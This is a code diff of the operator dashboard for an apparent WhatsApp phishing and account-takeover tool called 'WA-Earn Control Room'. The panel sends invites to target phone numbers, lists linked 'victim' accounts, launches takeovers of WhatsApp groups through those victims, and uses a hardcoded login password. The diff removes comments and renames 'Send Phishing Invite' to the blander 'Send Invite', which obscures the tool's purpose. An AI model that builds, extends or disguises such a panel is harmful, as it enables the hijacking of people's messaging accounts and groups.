@@ -19,20 +19,16 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
         body { background-color: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
         
-        /* Top Bar */
         .topbar { background: var(--card); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); }
         .logo { font-weight: 800; font-size: 20px; color: var(--text); display: flex; align-items: center; gap: 10px; }
         .logo span { color: var(--danger); font-size: 12px; background: rgba(239,68,68,0.2); padding: 4px 8px; border-radius: 4px; border: 1px solid var(--danger); margin-left: 10px; }
         
-        /* Layout */
         .dashboard { display: grid; grid-template-columns: 350px 1fr; gap: 20px; padding: 30px; max-width: 1400px; margin: 0 auto; width: 100%; }
         @media (max-width: 900px) { .dashboard { grid-template-columns: 1fr; } }
         
-        /* Panels */
         .panel { background: var(--card); border-radius: 16px; border: 1px solid var(--border); padding: 25px; }
         .panel-title { font-size: 16px; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
         
-        /* Forms & Inputs */
         .input-group { margin-bottom: 15px; }
         .input-group label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 8px; font-weight: 500; }
         .input-group input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border); background: var(--bg); color: var(--text); font-size: 14px; outline: none; }
@@ -44,27 +40,22 @@
         .btn-danger { background: rgba(239,68,68,0.1); color: var(--danger); border: 1px solid var(--danger); }
         .btn-danger:hover { background: var(--danger); color: white; }
         
-        /* Victim List */
         .victim-list { max-height: 600px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
         .victim-item { background: var(--bg); padding: 15px; border-radius: 8px; border: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
         .victim-phone { font-weight: 600; font-size: 15px; }
         .victim-status { font-size: 11px; color: var(--primary); display: flex; align-items: center; gap: 5px; margin-top: 5px; }
         .status-dot { width: 8px; height: 8px; background: var(--primary); border-radius: 50%; box-shadow: 0 0 8px var(--primary); }
         
-        /* Log Console */
         .console { background: #000; border-radius: 8px; padding: 15px; font-family: monospace; font-size: 12px; color: #a3be8c; height: 200px; overflow-y: auto; border: 1px solid var(--border); margin-top: 20px; }
         .console-line { margin-bottom: 5px; }
         .console-line.error { color: #bf616a; }
         .console-line.info { color: #81a1c1; }
         
-        /* Auth Screen */
         #auth-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 9999; display: flex; justify-content: center; align-items: center; }
         .auth-box { background: var(--card); padding: 40px; border-radius: 16px; border: 1px solid var(--border); width: 100%; max-width: 400px; text-align: center; }
     </style>
 </head>
 <body>
-
-    <!-- Auth Screen -->
     <div id="auth-screen">
         <div class="auth-box">
             <h2 style="margin-bottom: 20px;">System Login</h2>
@@ -75,7 +66,6 @@
         </div>
     </div>
 
-    <!-- Main App -->
     <div id="main-app" style="display: none;">
         <div class="topbar">
             <div class="logo">WA-Earn Control Room <span>LIVE</span></div>
@@ -83,10 +73,9 @@
         </div>
 
         <div class="dashboard">
-            <!-- Left Column: Actions -->
             <div>
                 <div class="panel" style="margin-bottom: 20px;">
-                    <div class="panel-title">📤 Send Phishing Invite</div>
+                    <div class="panel-title">📤 Send Invite</div>
                     <div class="input-group">
                         <label>Target Phone Number</label>
                         <input type="tel" id="target-number" placeholder="e.g. 2348012345678">
@@ -108,12 +97,10 @@
                 </div>
             </div>
 
-            <!-- Right Column: Victims & Logs -->
             <div>
                 <div class="panel" style="height: 100%;">
                     <div class="panel-title">🔗 Linked Accounts</div>
                     <div class="victim-list" id="victim-list">
-                        <!-- Victims populate here -->
                         <div style="color: var(--text-muted); text-align: center; padding: 20px;">Waiting for connections...</div>
                     </div>
                     
@@ -131,10 +118,9 @@
         const socket = io();
         let victims = [];
 
-        // Auth Logic
         function login() {
             const pass = document.getElementById('admin-pass').value;
-            if (pass === 'waearn2026') { // Hardcoded password
+            if (pass === 'waearn2026') { 
                 document.getElementById('auth-screen').style.display = 'none';
                 document.getElementById('main-app').style.display = 'block';
                 socket.emit('admin_join');
@@ -143,7 +129,6 @@
             }
         }
 
-        // Console Logger
         function log(msg, type = 'info') {
             const c = document.getElementById('console');
             const line = document.createElement('div');
@@ -154,7 +139,6 @@
             c.scrollTop = c.scrollHeight;
         }
 
-        // Send Invite
         function sendInvite() {
             const num = document.getElementById('target-number').value;
             if (!num) return alert('Enter a number');
@@ -162,7 +146,6 @@
             log(`Sending invite to ${num}...`, 'info');
         }
 
-        // Takeover Group
         function takeoverGroup() {
             const victim = document.getElementById('victim-number').value;
             const group = document.getElementById('group-jid').value;
@@ -171,7 +154,6 @@
             log(`Initiating takeover of ${group} using ${victim}...`, 'error');
         }
 
-        // Listen for Victim Updates
         socket.on('victim_update', (victimList) => {
             const listEl = document.getElementById('victim-list');
             if (victimList.length === 0) {
@@ -192,15 +174,13 @@
             });
         });
 
-        // Listen for logs from server
         socket.on('log', (data) => {
             log(data.msg, data.type);
         });
 
-        // Handle Enter key for login
         document.getElementById('admin-pass').addEventListener('keypress', function (e) {
             if (e.key === 'Enter') login();
         });
     </script>
 </body>
-  </html>
+</html>
